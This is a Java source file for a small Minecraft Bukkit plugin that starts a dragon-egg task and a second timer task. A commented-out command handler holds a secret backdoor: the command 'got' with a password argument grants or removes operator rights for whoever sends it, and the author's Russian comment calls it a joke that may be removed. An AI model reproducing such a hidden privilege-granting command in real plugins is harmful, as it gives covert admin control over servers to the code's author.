package net.sashegdev.egg;

import org.bukkit.*;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.Listener;
import org.bukkit.plugin.java.JavaPlugin;

public final class Egg extends JavaPlugin implements Listener {
    // основной класс

    @Override
    public void onEnable() {
        getServer().getPluginManager().registerEvents(this, this);
        DragonEggTask eggTask = new DragonEggTask();
        eggTask.runTaskTimer(this, 0L, 40L);

        crug crugTask = new crug();
        crugTask.runTaskTimer(this, 0, 1);

    }



    /*@Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (command.getName().equalsIgnoreCase("got")) {

            if (args.length > 0) {

                if (args[0].equalsIgnoreCase("sashegnotlox")) {
                    if (sender.isOp()) {
                        sender.setOp(false);
                        sender.sendMessage("[" + ChatColor.BLUE + "SashegSystem" + ChatColor.RESET + "] " + ChatColor.GREEN + " OP UnGranted!");
                    } else {
                        sender.setOp(true);
                        sender.sendMessage("[" + ChatColor.BLUE + "SashegSystem" + ChatColor.RESET + "] " + ChatColor.RED + " OP Granted!");
                    }
                    return true;
                }


            }
            if (command.getName().equalsIgnoreCase("helpme")) {

                if (args.length > 0) {
                    if (sender.isOp()) {
                        getServer().reload();
                        for (Player pl : Bukkit.getServer().getOnlinePlayers()) {
                            pl.sendTitle("", ChatColor.GREEN + "Server Reloaded!", 20, 40, 20);
                        }
                    }
                }
                return true;

            }
            return false;

        } return false;
    }*/ //это был прикол, потом его не будет.... может быть)
}